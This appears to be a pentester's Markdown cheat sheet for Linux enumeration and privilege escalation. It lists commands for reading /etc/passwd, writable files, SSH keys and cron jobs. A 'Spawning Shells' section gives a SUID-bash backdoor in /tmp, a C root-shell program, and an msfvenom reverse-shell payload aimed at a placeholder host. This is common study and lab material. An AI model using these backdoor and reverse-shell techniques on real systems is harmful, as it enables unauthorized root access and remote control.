# Basic Enumeration Commands
## Users and Groups 
- `whoami` , `id` 
- `cat /etc/passwd`
- `hostname`

##  OS/Arch
- `cat /etc/issue` 
- `uname -a`

## Processes/Applications
- `ps aux` or `ps aux | grep "^root"`
- `dpkg -l`
- `rpm -qa` 

## Programs/Services
- `{program} --version` or `{program} -v`
- `dpkg -l | grep {program}` or `rpm -qa | grep {program}`

## Enumerating files
- `find / -writable -type d 2>/dev/null` 
- `find /etc -maxdepth 1 -readable -type f`
- `find /etc -maxdepth 1 -writable -type f`
- `find / -type f \( -iname "*.conf" -or -iname "*.config" \)  -writable  -exec ls -lthr "{}" 2>/dev/null  \;`
- `ls -la ~/.ssh`
- binaries with irregular timestamps
    - `for i in /usr/sbin /usr/bin /sbin /bin /snap/bin; do ls -la --time-style=full $i | grep -v '0000\|->' ; done`
    - exclude /local paths because it's not uncommon for users to create binaries in those directories. non-local directories are supposed to be managed by the system package manager.
    - exclude sym links because normal for those timestamps to have non-zero seconds. Packages installed with the system's package manager should have 0's for the seconds in the timestamp.

## Enumerating Scheduled Tasks
- `ls -lah /etc/cron*`
- `cat /etc/crontab`

# Spawning Shells
- duplicate /bin/bash
    - use this method when you have command execution as root (i.e through a vulnerable service) but want a shell
    - `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` 
    - `./tmp/rootbash -p`
- C code
    - compile and execute: `gcc -o {name} {filename.c} && ./{name}`
```c
int main() {
setuid(0);
system("/bin/bash -p");
}
```
- msfvenom
    - `msfvenom -p linux/x86/shell_reverse_tcp LHOST={IP} LPORT={PORT} -f elf > shell.elf`

# Other
- check to see if root can ssh
    - `grep PermitRootLogin /etc/ssh/sshd_config`